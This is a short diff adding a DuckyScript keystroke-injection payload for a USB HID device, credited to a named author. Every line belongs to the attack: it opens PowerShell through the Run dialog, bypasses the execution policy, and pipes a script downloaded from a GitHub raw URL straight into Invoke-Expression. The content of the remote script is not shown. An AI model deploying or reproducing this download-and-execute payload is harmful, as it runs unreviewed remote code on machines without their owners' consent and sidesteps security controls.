@@ -1,0 +1,14 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+DELAY 1000
+ENTER
+DELAY 1000
+STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ztwAdmin/ZTW-2025/main/ASCII%20THREATLOCKER.ps1')
+ENTER
